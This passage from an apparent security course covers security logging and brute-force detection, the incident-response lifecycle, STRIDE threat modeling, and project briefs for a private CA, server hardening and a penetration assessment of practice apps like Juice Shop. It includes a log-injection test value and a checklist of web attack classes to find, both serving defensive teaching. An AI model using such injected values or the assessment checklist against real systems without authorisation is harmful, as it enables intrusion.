python3 - <<'PY'
import json, datetime, hashlib
def audit(event, **fields):
    rec = {"ts": datetime.datetime.now(datetime.UTC).isoformat(),
           "event": event, **fields}
    # redact: never log the token; log a short hash for correlation
    if "token" in rec:
        rec["token_fp"] = hashlib.sha256(rec.pop("token").encode()).hexdigest()[:12]
    # neutralise log injection
    line = json.dumps(rec).replace("\n", "\\n")
    print(line)
audit("auth.login.fail", user="alice", src_ip="203.0.113.9",
      ua="curl/8", reason="bad_password", request_id="req-abc123")
audit("authz.deny", user="bob", src_ip="198.51.100.4",
      object="orders/1002", action="read", request_id="req-def456")
audit("token.issue", user="alice", token="super-secret-value")
PY

# 2. Stand up a log stack and a detection (docker)
#    Loki + Grafana + Promtail, or the Elastic one-liner:
#    docker run -d --name es -p 9200:9200 -e discovery.type=single-node \
#      -e xpack.security.enabled=false docker.elastic.co/elasticsearch/elasticsearch:8.15.0

# 3. Detect brute force from auth logs with a threshold query (jq demo)
cat > auth.log <<'EOF'
{"ts":"2026-09-10T10:00:01Z","event":"auth.login.fail","user":"a","src_ip":"5.5.5.5"}
{"ts":"2026-09-10T10:00:02Z","event":"auth.login.fail","user":"b","src_ip":"5.5.5.5"}
{"ts":"2026-09-10T10:00:03Z","event":"auth.login.fail","user":"c","src_ip":"5.5.5.5"}
{"ts":"2026-09-10T10:00:04Z","event":"auth.login.fail","user":"d","src_ip":"5.5.5.5"}
{"ts":"2026-09-10T10:00:05Z","event":"auth.login.fail","user":"e","src_ip":"5.5.5.5"}
{"ts":"2026-09-10T10:00:06Z","event":"auth.login.ok","user":"e","src_ip":"5.5.5.5"}
EOF
jq -s 'group_by(.src_ip)[] | {ip: .[0].src_ip,
   fails: (map(select(.event=="auth.login.fail"))|length),
   then_success: (any(.event=="auth.login.ok"))}
   | select(.fails >= 5 and .then_success)
   | "ALERT: brute force likely succeeded from \(.ip) (\(.fails) fails)"' auth.log

# 4. Explore a real detection ruleset
git clone --depth 1 https://github.com/SigmaHQ/sigma
ls sigma/rules/web/ sigma/rules/application/    # read a few .yml rules
```

### Mini-project (60 min): SecureShop detection baseline

```
   1. Define SecureShop's security log schema (JSON fields, event names)
      covering the "what to log" list; implement `audit()` in the app.
   2. Ship logs to a local Loki/Elastic; confirm they're queryable and
      that the app host cannot delete central copies.
   3. Write 5 detections (as Sigma rules or stack queries) with runbooks:
      credential stuffing, IDOR enumeration, admin action by dormant
      account, JWT signature failures, outbound to new IP from app tier.
   4. Simulate each (a script that generates the matching log pattern);
      confirm the alert fires; record MTTD.
   5. Redaction test: attempt to log a token/password/PAN; prove it's
      masked. Log-injection test: user field = "x\n{fake event}"; prove
      it's neutralised.
   6. Report -> ~/sec-lab/reports/part11-detection.md (schema, rules,
      simulation results, coverage vs ATT&CK).
```

### Common confusions

- **"We log everything, so we're covered."** Volume without a schema, central
  store, and tuned alerts is a bill, not a capability. You need *findable*
  security events and *actionable* alerts.
- **"Logs on the box are fine."** First thing an attacker does is clear them.
  Ship off-host, append-only.
- **"More alerts = more secure."** Alert fatigue makes you blind. Few, precise,
  runbooked alerts beat hundreds of noisy ones.
- **"Debug logging is harmless."** Debug logs routinely capture tokens, bodies,
  and PII, and often ship to third-party APM. Redact by default.
- **"We'll add detections after launch."** You can't investigate a breach with
  logs you didn't keep. Minimum viable logging is a launch requirement.

### Check yourself

1. List six categories of security event worth logging, with the fields every
   event should carry.
2. Name five things you must never log, and how you prevent it.
3. Why must logs be central, append-only, and time-synced?
4. What makes a good alert? What does an alert need besides the rule?
5. What is detection-as-code and why map detections to ATT&CK?

### Further reading

- **Cheat sheet:** OWASP "Logging Cheat Sheet" and "Logging Vocabulary Cheat
  Sheet" (standard event names).
- **Project:** SigmaHQ (`github.com/SigmaHQ/sigma`) — portable detection rules;
  MITRE ATT&CK (`attack.mitre.org`); Atomic Red Team (adversary emulation).
- **Book:** *Practical Threat Intelligence and Data-Driven Threat Hunting*
  (Valentina Costa-Gazcón); the Google SRE "Monitoring" chapters.
- **Guidance:** NIST SP 800-92 (log management); the Elastic / Splunk / Wazuh
  detection docs; "Detection Engineering" writeups from the Palantir and
  Netflix blogs.

---

## Chapter 51 — Incident response

### In one sentence

Incident response is a rehearsed process — prepare, detect, contain, eradicate,
recover, learn — that turns a chaotic "we're breached" moment into a series of
known steps, and the preparation matters more than the heroics.

### The lifecycle (NIST SP 800-61)

```
   1. PREPARATION      before anything happens
      - IR plan + playbooks (ransomware, cred compromise, data exfil,
        web-app breach, insider, supply-chain, DDoS)
      - roles: Incident Commander, Comms lead, Scribe, technical leads,
        Legal, Exec sponsor. A RACI. On-call rotation.
      - contact tree (incl. out-of-band: what if Slack/email is
        compromised?), retainer with an IR/forensics firm, cyber-insurance
        contacts, law-enforcement contacts
      - tooling ready: EDR, centralised logs (Ch 50), ability to isolate a
        host/rotate all creds/pull an image, a clean-room comms channel
      - RUNBOOKS TESTED via tabletop exercises + at least one live drill/yr

   2. DETECTION & ANALYSIS
      - triage: is it real? scope? severity? (define severities in advance)
      - declare an incident; assign an IC; start the timeline doc
        (every action, UTC, who) -- this is evidence and post-mortem input
      - preserve evidence BEFORE you change things (see forensics below)

   3. CONTAINMENT
      - SHORT-TERM: stop the bleeding -- isolate hosts (network quarantine,
        not power-off if you want memory), disable compromised accounts,
        revoke tokens/keys, block C2 IPs/domains, take the app to
        maintenance mode if needed
      - decide: monitor-and-learn vs contain-now (tips toward contain-now
        if data is actively leaving)
      - LONG-TERM: temporary fixes that let you operate while eradicating
        (patched hosts rebuilt from known-good, tighter rules)

   4. ERADICATION
      - remove the foothold: rebuild (don't "clean") compromised systems
        from trusted images, patch the entry vector, reset ALL potentially
        exposed credentials, remove persistence (cron, services, keys,
        webshells, IAM backdoors, OAuth grants)
      - confirm the initial access vector is actually closed

   5. RECOVERY
      - restore from known-good backups (verify integrity, scan first),
        return systems to prod in a monitored, staged way
      - heightened monitoring for recurrence (attackers retry)
      - define exit criteria: when is the incident "closed"?

   6. POST-INCIDENT ("lessons learned")
      - BLAMELESS post-mortem within ~2 weeks: timeline, root cause (5
        whys / causal analysis), what worked, what didn't, dwell time,
        MTTD/MTTC
      - concrete action items with owners and dates; track to done
      - update playbooks, detections, and controls
```

### Containment decisions under pressure

```
   Pull network, keep power    -> preserves RAM (malware, keys, live
                                  processes) for forensics. Preferred if
                                  you have the capability.
   Power off                   -> stops encryption/exfil fast, but destroys
                                  volatile evidence. Sometimes the right
                                  call (active ransomware encryption).
   Leave running, watch        -> only if exfil is NOT ongoing and you have
                                  the monitoring to learn scope safely.
   Rotate credentials WIDELY   -> almost always, early. Assume the blast
                                  radius is bigger than it looks.
```

### Forensic basics (do no harm to the evidence)

```
   ORDER OF VOLATILITY (collect most-volatile first):
     CPU registers/cache -> RAM -> network state (connections, ARP, routes)
     -> running processes -> disk -> logs/archives -> physical config

   PRINCIPLES:
     - work on COPIES; hash originals (SHA-256) and record the hash
     - maintain CHAIN OF CUSTODY (who touched what, when, why)
     - capture memory before shutdown (avml, LiME, WinPMEM)
     - image disks with a write-blocker; `dd`/` dc3dd` + hash
     - note system time vs true time (clock skew)
     - if it may go legal, involve Legal EARLY and follow their guidance
   You don't need to be a forensic examiner -- you need to not TRAMPLE the
   scene before one arrives.
```

### Comms and obligations

```
   INTERNAL: single source of truth (the timeline doc + a status channel),
     regular exec updates, need-to-know for details.
   EXTERNAL: legal/regulatory timelines are real and short:
     - GDPR: notify the supervisory authority within 72 HOURS of becoming
       aware of a personal-data breach (and affected individuals if high
       risk).
     - US: state breach laws, SEC 4-day material-incident disclosure for
       public companies, sector rules (HIPAA, PCI, GLBA), CIRCIA.
     - contractual: customer notification SLAs.
   Prepare holding statements in advance. Do NOT speculate publicly on
   cause/scope before you know. Coordinate with Legal + PR.
```

### Practice (40 min) — tabletop

```
   Run a 45-minute tabletop with 2-4 people (or solo, writing it out).

   SCENARIO: "At 02:14 an alert fires: SecureShop's orders-api tier made
   200 outbound HTTPS connections to an IP in a country you don't operate
   in. A dev notices the admin panel has a new user 'svc_backup' created
   at 01:50. crt.sh shows a cert issued for admin.securesh.op by a CA you
   don't use, 3 days ago."

   Work through, writing decisions + timestamps:
   1. Is this an incident? Severity? Who is IC? What's the first action in
      the next 5 minutes?
   2. Contain: what do you isolate/disable/revoke, in what order? What do
      you preserve first?
   3. What logs/data do you pull, and from where (Ch 50)? What's the
      likely initial vector given the cert + new user + egress?
   4. Eradicate: rebuild vs clean? Which credentials get rotated? How do
      you know the door is shut?
   5. Recover: backup strategy, exit criteria, extra monitoring.
   6. Obligations: is personal data implicated? Clock started when? Who do
      you notify and by when?
   7. Post-mortem: 3 action items you'd bet money on.

   Write it to ~/sec-lab/reports/part11-ir-tabletop.md.
```

### Common confusions

- **"IR is what you do after a breach."** 80% of IR is *preparation* — plans,
  playbooks, tooling, drills. Mid-incident is a bad time to discover you can't
  isolate a host or find the logs.
- **"Wipe and reinstall the infected box."** That destroys evidence and you may
  miss the entry vector and persistence, guaranteeing a repeat. Preserve, then
  rebuild from known-good.
- **"Change the one password we know was phished."** Assume broader compromise;
  rotate widely and early.
- **"Post-mortems find who to blame."** Blameless post-mortems find *systemic*
  causes. Blame makes people hide information in the next incident.
- **"We'll notify once we fully understand it."** Regulatory clocks (GDPR 72h,
  SEC 4 days) start at *awareness*, not at *full understanding*. Involve Legal
  immediately.

### Check yourself

1. Name the six phases of the IR lifecycle. Which consumes most of the effort?
2. Why prefer "pull network, keep power" over powering off — and when is powering
   off right?
3. State the order of volatility for evidence collection.
4. What is chain of custody and why does it matter?
5. When does the GDPR 72-hour clock start?
6. What makes a post-mortem "blameless" and why does that matter?

### Further reading

- **Standard:** NIST SP 800-61 Rev. 2 (Computer Security Incident Handling
  Guide) — the canonical lifecycle. SANS "Incident Handler's Handbook" for a
  shorter version.
- **Book:** *Incident Response & Computer Forensics* (3rd ed.), Luttgens et al.;
  *Intelligence-Driven Incident Response*, Scott Roberts.
- **Playbooks:** the PagerDuty Incident Response docs (`response.pagerduty.com`),
  the Google SRE "Managing Incidents" chapter, and public IR playbook repos
  (Counteractive, AWS IR runbooks).
- **Practice:** tabletop scenario packs (CISA Tabletop Exercise Packages);
  `thehive-project.org` (case management); Atomic Red Team for realistic
  telemetry.
- **Legal:** your jurisdiction's breach-notification summary (IAPP maintains
  good charts); GDPR Art. 33/34 text.

---

## Chapter 52 — Threat modeling and secure design

### In one sentence

Threat modeling is a structured conversation, held *before* you build, about what
you're building, what can go wrong, and what you'll do about it — and it's the
cheapest security activity per bug prevented.

### The four questions (Shostack's framework)

```
   1. WHAT ARE WE BUILDING?      a diagram: components, data stores, data
                                 flows, and TRUST BOUNDARIES (where data
                                 crosses from less- to more-trusted, or
                                 between owners). Keep it simple -- a
                                 whiteboard DFD, not a 40-page doc.
   2. WHAT CAN GO WRONG?         enumerate threats against each element and
                                 each flow crossing a boundary (use STRIDE
                                 as a prompt).
   3. WHAT ARE WE GOING TO DO?   for each threat: MITIGATE (add a control),
                                 ELIMINATE (remove the feature/data),
                                 TRANSFER (someone else's problem -- e.g.
                                 use a managed service), or ACCEPT
                                 (document, with sign-off).
   4. DID WE DO A GOOD JOB?      review it; revisit when the design changes;
                                 check the mitigations actually shipped and
                                 have tests.
```

### STRIDE — a checklist for "what can go wrong"

```
   S  Spoofing              pretending to be someone/something
        -> authentication (Ch 46), mTLS (Ch 31), signed messages (Ch 21)
   T  Tampering             unauthorised modification of data/code
        -> integrity: AEAD (Ch 15), HMAC/signatures, input validation,
           access control (Ch 45), signed artifacts (Ch 47)
   R  Repudiation           "I didn't do that" (and you can't prove otherwise)
        -> audit logging (Ch 50), signatures/non-repudiation (Ch 21)
   I  Information disclosure exposure of data to the wrong party
        -> encryption in transit/at rest, least privilege, redaction,
           avoiding verbose errors, minimising data collected
   D  Denial of service     making it unavailable
        -> rate limiting, quotas, timeouts, autoscaling, input-size caps,
           algorithmic-complexity review, CDN/anti-DDoS
   E  Elevation of privilege gaining capabilities you shouldn't have
        -> authz on every request (Ch 45), sandboxing, least privilege,
           memory-safe languages / careful native code, no injection (Ch 42)

   Walk each component and data flow, ask "how could each letter apply
   here?" -- STRIDE is a creativity prompt, not a compliance form.
```

Other lenses you can layer in: **attack trees** (goal → sub-goals), **LINDDUN**
(privacy threats), **abuse/misuse cases**, **kill-chain / MITRE ATT&CK** (how a
real adversary would progress), and **"what would a malicious insider do?"**.

### Secure-design principles (Saltzer & Schroeder, still current)

```
   Least privilege            minimum rights, minimum time
   Fail-safe defaults          deny by default; errors deny access (Ch 3:
                               fail-closed vs fail-open -- choose per context)
   Defense in depth            no single control is trusted to hold
   Complete mediation          check EVERY access, every time (no caching a
                               stale "yes" -- Ch 45)
   Economy of mechanism        keep the security-critical part small and
                               simple enough to audit
   Open design                 security from keys/config, not secrecy of
                               design (Kerckhoffs, Ch 12)
   Separation of privilege      require two conditions (MFA, 4-eyes on
                               deploys, split keys)
   Least common mechanism       don't share state/resources across trust
                               levels (multi-tenant isolation)
   Psychological acceptability   if it's too painful, people bypass it ->
                               design the secure path to be the easy path
   Minimise attack surface      fewer endpoints, features, deps, ports, data
   Secure the weakest link      attackers target it; find yours
```

### The SecureShop threat model (the Chapter 4 payoff)

Chapter 4 asked you to write down your instincts for four questions. Here's the
worked answer, as a threat model. Compare it to what you wrote.

```
   SYSTEM (DFD, simplified):

     [Customer browser] --HTTPS--> (TB1) [edge/nginx] --> (TB2) [web/API]
                                                              |
                                              (TB3)  --mTLS-->[orders-api]
                                                              |
                                              (TB4)  -------->[PostgreSQL]
     [Admin browser] --HTTPS+mTLS--> (TB1') [admin app] --(TB3)--> orders-api
     [CI/CD] --signed artifact--> (TB5) [deploy] --> web/API, orders-api

   TRUST BOUNDARIES: TB1 internet->DMZ, TB2 DMZ->app, TB3 service->service,
   TB4 app->data, TB5 build->runtime, plus browser<->server (attacker owns
   the client).

   THREATS (STRIDE, selected) and DECISIONS:

   PASSWORD STORAGE  (your Ch 4 instinct: ______)
     T/I: DB theft -> offline cracking.
     -> Argon2id, per-user salt, pepper in KMS (Ch 10). MFA available;
        passkeys roadmap (Ch 46). Breached-password screening. ACCEPT
        residual risk of weak user passwords, mitigated by MFA + rate limit.

   KEY STORAGE  (your Ch 4 instinct: ______)
     I/E: JWT signing key, DB creds, TLS private keys.
     -> Secrets manager; workload identity; no secrets in repo/image
        (Ch 49). 2-versions-live rotation runbook, tested. TLS keys
        non-exportable where possible.

   PER-CUSTOMER AUTHZ  (your Ch 4 instinct: ______)
     E/I: IDOR on /orders/:id, /baskets/:id; horizontal escalation.
     -> Ownership in the WHERE clause on every query; centralised policy
        layer; 404 not 403; automated "as another user" tests (Ch 45).
        Object IDs are UUIDv4 (defence in depth, not the control).

   PRICE / TOTAL TAMPERING  (your Ch 4 instinct: ______)
     T: client submits price/total/discount.
     -> Server recomputes every monetary value from DB prices; coupons
        validated server-side; ignore client-supplied totals entirely.
        Idempotency keys + row locks on checkout to kill race conditions
        (Ch 45, insecure design).

   OTHER NOTABLE:
     S  admin impersonation      -> admin app requires mTLS + SSO + MFA;
                                    short sessions; admin actions logged &
                                    alerted (Ch 50).
     T  supply-chain             -> SBOM + scan + signed images verified at
                                    deploy; Actions pinned to SHA (Ch 47).
     R  "I didn't refund that"   -> immutable audit log of all admin/money
                                    actions (Ch 50).
     I  SSRF from "import from URL"-> allowlist + post-resolution IP check;
                                    IMDSv2; isolated egress (Ch 44).
     D  checkout/login flooding  -> rate limits per-account & per-IP; WAF;
                                    CDN; input-size caps.
     E  container breakout       -> non-root, read-only FS, seccomp,
                                    dropped caps, segmented network (Ch 39).

   RESIDUAL RISKS (accepted, with owner + review date): weak user
   passwords (mitigated), a rogue CA issuing for our domain (detected via
   CT monitoring, Ch 30), a determined malicious insider with DB access
   (mitigated by logging + separation of duties, not eliminated).
```

### When and how to do it (lightweight, continuous)

```
   * At design time for anything new or significantly changed. 60-90 min,
     the team + a security-minded facilitator, a whiteboard.
   * "Threat model every story" for high-risk components: a 2-line
     "security notes" field in the ticket.
   * Keep the artifact IN THE REPO (docs/threat-model.md + the diagram as
     code -- e.g. `pytm`, Threagile, or just Mermaid). Review it in PRs
     that change the design.
   * Track mitigations as issues; verify they shipped with tests.
   * Re-run after incidents (a real attack is ground truth).
```

### Practice / capstone (90 min): threat-model your own project

```
   1. Pick a real system you work on (or SecureShop).
   2. Draw the DFD: components, data stores, flows, trust boundaries.
      (Whiteboard photo, or Mermaid, or `pytm`.)
   3. For each element and each flow crossing a boundary, run STRIDE.
      Aim for ~15-30 concrete threats.
   4. For each threat, decide: mitigate / eliminate / transfer / accept.
      Name the control and where it lives in this guide.
   5. List residual/accepted risks with an owner and a review date.
   6. Cross-check against the secure-design principles list -- any
      violated? (Shared DB creds across services? A cached authz "yes"?
      A security check that's easy to skip?)
   7. Produce docs/threat-model.md + diagram, and open issues for the
      top 5 unmitigated threats.
   8. Compare with your Chapter 4 notes: what did you get right by
      instinct, and what did this guide change?
```

### Common confusions

- **"Threat modeling needs a specialist and weeks."** A team with a whiteboard
  and the four questions produces most of the value in 90 minutes. Depth comes
  with practice.
- **"STRIDE is a compliance checklist."** It's a *prompt* for imagination against
  each component. The output is threats and decisions, not a filled form.
- **"We did it once."** Designs change; threat models are living docs, reviewed
  when architecture changes and after incidents.
- **"We'll accept that risk" (verbally)."** Accepted risk must be *written*, with
  an owner and a review date, and visible to someone accountable. Otherwise it's
  just an unfixed bug.
- **"Secure design is about adding controls."** Often the best move is
  *elimination* — don't collect the data, don't expose the endpoint, use a
  managed service — which removes the threat instead of guarding it.

### Check yourself

1. State Shostack's four questions.
2. Expand STRIDE and give one mitigation for each letter.
3. What is a trust boundary, and why do threats cluster at them?
4. Name five Saltzer & Schroeder principles and what each means in one line.
5. For SecureShop's "client submits the price" threat, what's the fix, and which
   STRIDE letter(s) is it?
6. What are the four possible decisions for a given threat?

### Further reading

- **Book:** *Threat Modeling: Designing for Security*, Adam Shostack — the
  standard text. Also his free "Threat Modeling 101" resources and the Threat
  Modeling Manifesto (`threatmodelingmanifesto.org`).
- **Paper:** Saltzer & Schroeder, "The Protection of Information in Computer
  Systems" (1975) — the design principles, still quoted 50 years on.
- **Tools:** Microsoft Threat Modeling Tool; OWASP `pytm` (threat model as code);
  Threagile; OWASP Threat Dragon (free, diagram-based).
- **Cheat sheet:** OWASP "Threat Modeling Cheat Sheet" and "Secure Product
  Design Cheat Sheet".
- **Privacy lens:** LINDDUN (`linddun.org`) for privacy threat modeling.

---

### End of Part 11 — Milestone check

- [ ] I can list where secrets leak and order storage approaches best→worst
- [ ] **I set up secret scanning + push protection and issued a dynamic,
      short-lived credential**
- [ ] I can describe the 2-versions-live rotation pattern and have tested one
- [ ] I know what to log, what never to log, and why logs must be central and
      append-only
- [ ] **I built a detection baseline: schema, rules with runbooks, simulated
      attacks, measured MTTD**
- [ ] I can recite the IR lifecycle and know preparation is most of it
- [ ] I know the containment trade-offs and the order of volatility
- [ ] **I ran an IR tabletop end to end and wrote it up**
- [ ] I can run a STRIDE threat model against a real system
- [ ] **I produced a threat model for my own project and compared it to my
      Chapter 4 instincts**

---

# Part 12 — Projects

Four end-to-end projects that combine everything. Each has a brief, a deliverable,
a "definition of done", and a grading rubric so you can judge your own work. Do
them in order — each builds on the last, and all four target **SecureShop**
(Chapter 4). Budget a weekend each, or a week at a relaxed pace.

Set up once:

```
   ~/sec-lab/
     ca/          your PKI (Ch 29)
     keys/        key material (Ch 22)
     tools/       release-sign (Ch 22/26), tls-audit (Ch 32), monitors
     reports/     one markdown report per Part -- you have 7 already
     projects/
       p1-ca-mtls/  p2-harden/  p3-breakfix/  p4-pq-audit/
```

Everything runs locally in containers or VMs you own (Chapter 0.6).

---

## Chapter 53 — Project 1: your own CA, plus mutual TLS

### Brief

Build the certificate authority that issues every certificate SecureShop uses —
public-facing server certs, internal service certs, and client certs for mTLS —
with a proper offline root, an online issuing intermediate, sane profiles, a
revocation mechanism, and automated renewal. Then wire three services to use it
and prove the trust decisions are correct.

### Architecture

```
                 SecureShop Dev Root CA         (offline: key encrypted,
                   ed25519, 10-year, CA:TRUE      never on a networked box)
                          | signs ONE thing: the intermediate
                          v
                 SecureShop Issuing CA           (online: does day-to-day
                   ecdsa P-256, 3-year,           issuance; pathlen:0)
                   CA:TRUE, pathlen:0
                   /              |             \
   server profile     client profile        internal-service profile
   EKU serverAuth     EKU clientAuth         EKU serverAuth+clientAuth
   90-day, SANs       30-day, CN=identity    7-day, SPIFFE-style URI SAN
        |                    |                        |
   shop.securesh.op     orders-api-client        orders-api  <-> postgres
   www.securesh.op      admin-console            (both present + verify certs)
```

### Tasks

```
   1. ROOT
      - ed25519 key, encrypted at rest (openssl pkey -aes-256-cbc).
      - Self-signed cert, basicConstraints critical CA:TRUE,
        keyUsage critical keyCertSign,cRLSign. 10 years.
      - Store the passphrase in your secrets manager (Ch 49), not a file.

   2. INTERMEDIATE
      - ECDSA P-256 key. CSR -> signed by root with pathlen:0.
      - This is the only key the issuing scripts touch.

   3. PROFILES (an openssl.cnf or a small `issue` script per type)
      - server:   SAN(s) required; EKU serverAuth; 90d; CA:FALSE.
      - client:   CN = a stable identity; EKU clientAuth; 30d.
      - service:  URI SAN spiffe://securesh.op/ns/default/sa/<name>;
                  EKU serverAuth,clientAuth; 7d.
      - Reject requests that don't match the profile (e.g. server cert
        with no SAN -> refuse).

   4. REVOCATION
      - Maintain a CRL (openssl ca -gencrl) OR run a tiny OCSP responder
        (openssl ocsp -index ...). Revoke a test cert; prove clients
        reject it.

   5. WIRE IT UP
      - nginx/Caddy for shop.securesh.op with the server cert; HTTP->HTTPS
        redirect; TLS 1.3+1.2, AEAD only; HSTS.
      - /admin location: require a client cert (verify against the
        intermediate); no cert -> 403.
      - orders-api <-> postgres: mutual TLS, each verifies the other's
        service cert against your CA (Postgres: ssl=on, clientcert=verify-full).

   6. RENEWAL
      - A cron/systemd-timer script that reissues any cert < 1/3 of its
        lifetime remaining, reloads the service, and alerts on failure.
      - Bonus: stand up `step-ca` or Vault PKI and drive it via ACME so
        renewal is fully hands-off.

   7. VERIFY (write results into the report)
      - openssl verify -show_chain for each leaf.
      - curl --cacert (works), curl (fails, cert error), curl -k (works
        but note the danger).
      - testssl.sh / sslyze against shop.securesh.op -> A-equivalent.
      - mTLS: connection with/without a valid client cert.
      - Revoke -> client rejects. Expire (issue with -days 1, wait) ->
        client rejects.
      - Break the chain (omit intermediate) -> curl fails; explain why a
        browser might not.
```

### Deliverable

`~/sec-lab/projects/p1-ca-mtls/` containing: the CA scripts/config, the service
configs, the renewal script, and `report.md` with every verification above
(command + output + one-line explanation), plus a diagram of your PKI and the
trust decisions.

### Definition of done

- [ ] Root is offline and its key is encrypted; you can state exactly where the
      passphrase lives.
- [ ] Every leaf verifies to the root through the intermediate.
- [ ] Each profile enforces its constraints (a wrong-shaped request is refused).
- [ ] `shop.securesh.op` scores A-equivalent on testssl.sh/sslyze.
- [ ] `/admin` is reachable only with a valid client cert.
- [ ] `orders-api`↔Postgres is mutually authenticated.
- [ ] Revocation works (CRL or OCSP), demonstrated.
- [ ] Renewal is automated and alerts on failure.

### Rubric (score yourself /100)

```
   PKI structure & key protection ........... 20
   Correct, enforced cert profiles ......... 15
   Server TLS hardening (A-grade) .......... 15
   mTLS on /admin and service-to-service ... 20
   Revocation implemented & proven ......... 10
   Automated renewal + alerting ........... 10
   Report quality (evidence + reasoning) .. 10
```

### Further reading

- **Book (free):** *OpenSSL Cookbook*, Ivan Ristić — the CA and CSR chapters.
- **Docs:** smallstep `step-ca` "Run your own private CA" tutorial; HashiCorp
  Vault PKI secrets engine; `mkcert` (for the "just works locally" contrast).
- **Article:** "Everything you should know about certificates and PKI" — Mike
  Malone (smallstep).
- **Spec:** SPIFFE/SPIRE docs — the URI-SAN service-identity model.
- **Guidance:** CA/Browser Forum Baseline Requirements (skim the profile
  sections to see what "real" cert profiles constrain).

---

## Chapter 54 — Project 2: harden a server end to end

### Brief

Take a single Linux host running SecureShop's web/API tier and harden it from a
default install to something you'd defend in a review — OS, network, service,
container, secrets, logging — measuring before and after against a benchmark.

### Starting point

A fresh VM (Debian/Ubuntu or a RHEL derivative) running the SecureShop app in a
container, with the Project 1 certificates. Snapshot it first so you can re-run.

### Tasks

```
   1. BASELINE (measure first)
      - Run a CIS Benchmark scan: `lynis audit system`, and
        OpenSCAP with the CIS or STIG profile
        (`oscap xccdf eval --profile cis ...`).
      - Record the score and the top 20 findings.
      - nmap the box from outside: every open port -> justify or close.

   2. OS / HOST
      - Patch; enable unattended security updates.
      - Remove unused packages and services; disable IPv6 only if truly
        unused (else configure it).
      - Non-root service user; no login shells for service accounts.
      - sudo: least privilege, logged; no NOPASSWD for humans.
      - Kernel hardening: sysctl (rp_filter, tcp_syncookies,
        kptr_restrict, dmesg_restrict, disable unused protocols),
        `nf_conntrack` limits.
      - Filesystem: separate/`noexec,nodev,nosuid` on /tmp, /var/tmp,
        /dev/shm; auditd installed.
      - MAC: AppArmor/SELinux in enforcing mode for the service.
      - Time sync (chrony) -- needed for logs (Ch 50) and certs.

   3. SSH (Part 8)
      - Key-only, no root, no passwords, AllowGroups, modern
        Kex/Ciphers/MACs, reachable only from the bastion subnet.
      - `ssh-audit` -> clean.

   4. NETWORK (Part 9)
      - nftables default-deny inbound: 443 from anywhere, 22 from bastion.
      - Default-deny OUTBOUND: allow only DNS to your resolver, 443 to
        package mirrors + your APIs + monitoring. Log drops.
      - fail2ban or nftables rate-limit on 22/443.

   5. SERVICE / APP
      - Run as non-root in a container: read-only rootfs, `--cap-drop ALL`
        (add back only what's needed), `--security-opt no-new-privileges`,
        a seccomp profile, a tmpfs for scratch, resource limits.
      - Distroless/minimal base image, pinned by digest (Ch 47).
      - TLS via Project 1 certs; HSTS; security headers (Ch 41/43);
        server tokens/version banners off.
      - Healthcheck + auto-restart; graceful shutdown.

   6. SECRETS (Ch 49)
      - No secrets in the image, env file, or compose file. App pulls from
        a secrets manager using a host/workload identity.
      - Secret scan the build context.

   7. LOGGING (Ch 50)
      - Structured app audit logs + auditd + nftables drops shipped
        off-host over TLS to a central store the app host can't purge.
      - 3 detections with runbooks (e.g. outbound-drop spike, SSH auth
        anomaly, app authz-deny spike).

   8. RE-MEASURE
      - Re-run lynis / OpenSCAP -> new score; diff the findings.
      - Re-run external nmap -> attack surface delta.
      - Confirm the app still works end to end (don't harden it into a
        brick -- keep a functional smoke test).
```

### Deliverable

`~/sec-lab/projects/p2-harden/` with: the config (as scripts / Ansible / a
Dockerfile + compose or systemd units — infrastructure as code, so it's
repeatable), `before.md` and `after.md` scan outputs, and `report.md` with the
score delta, the surface delta, each change and its rationale (mapped to a CIS
control or a chapter), and anything you deliberately did *not* do (with why).

### Definition of done

- [ ] Lynis/OpenSCAP score materially improved; you can explain every remaining
      finding (fix, accept-with-reason, or false positive).
- [ ] External nmap shows only 443 (and 22 from the bastion).
- [ ] Outbound is default-deny with a justified allowlist.
- [ ] Container runs non-root, read-only, least-capability, seccomp-confined.
- [ ] No secret is present in the image or compose/env files.
- [ ] Logs reach a store the host cannot tamper with; 3 detections fire in test.
- [ ] The app still passes a full functional smoke test.
- [ ] The whole build is reproducible from code in the repo.

### Rubric (/100)

```
   Measured before/after with a real benchmark .. 15
   OS + kernel + MAC hardening ................. 20
   Network (in + egress) + SSH ................. 20
   Container/service hardening ................. 20
   Secrets handled correctly .................. 10
   Logging + working detections ............... 10
   IaC / reproducibility + report ............. 5
```

### Further reading

- **Benchmarks:** CIS Benchmarks (free PDFs after signup); DISA STIGs; the
  `lynis`, OpenSCAP/`scap-security-guide`, and `Trivy`/`kube-bench` docs.
- **Container:** NIST SP 800-190 (Application Container Security Guide); Docker/
  Podman "rootless" and seccomp docs; the CIS Docker Benchmark.
- **Automation:** `dev-sec/ansible-collection-hardening`, `ansible-lockdown` roles.
- **Book:** *Linux Hardening in Hostile Networks*, Kyle Rankin; *Practical Linux
  Security Cookbook*.
- **Guidance:** Mozilla's server-side security guidelines; the NSA/CISA
  "Kubernetes Hardening Guidance" if you take the bonus to k8s.

---

## Chapter 55 — Project 3: break and fix a vulnerable application

### Brief

Do a full security assessment of a deliberately-vulnerable app: find issues
across every OWASP category, write them up like a professional report, then
**fix a representative subset in code** with tests that prove closure — and
re-test to confirm.

### Target options (pick one, all legal to test)

```
   * OWASP Juice Shop        (Node/Angular; the reference target)
   * OWASP WebGoat           (Java; guided lessons)
   * DVWA / bWAPP            (PHP; classic)
   * a "vulnerable by design" app in YOUR stack (django-DefectDojo's
     test fixtures, RailsGoat, NodeGoat, etc.) -- best for the FIX phase
```

For the fix phase you need the source, so favour a target whose code you can
edit and redeploy.

### Phase 1 — Assess (use the Ch 48 methodology)

```
   Proxy everything through Burp/ZAP. Work the methodology: map -> auth &
   session -> access control -> input handling -> client-side -> business
   logic -> infra/misc.

   Find and evidence AT LEAST:
     [ ] 2x Injection (e.g. SQLi + command/NoSQL/SSTI)
     [ ] 2x XSS (two of reflected/stored/DOM)
     [ ] 2x Broken access control (IDOR + BFLA/mass-assignment/path-trav)
     [ ] 1x Authentication/session/JWT
     [ ] 1x CSRF or SSRF or CORS
     [ ] 1x Cryptographic failure (weak hash, missing TLS, secret in JS,
             predictable token)
     [ ] 1x Security misconfiguration (headers, exposed file, debug
             endpoint, default creds, verbose error)
     [ ] 1x Vulnerable component (retire.js / SCA)
     [ ] 1x Business-logic flaw (price tampering, coupon abuse, race,
             step-skipping)
```

### Phase 2 — Report (this is a real skill)

One document, per-finding sections, ordered by risk:

```
   Title | Severity (CVSS v3.1 vector + score) + business impact
   Affected: endpoint(s), parameter(s), preconditions
   Steps to reproduce: numbered, copy-pasteable, with the exact
     request/response (redacted) as evidence
   Root cause: the actual code/config defect (name the class)
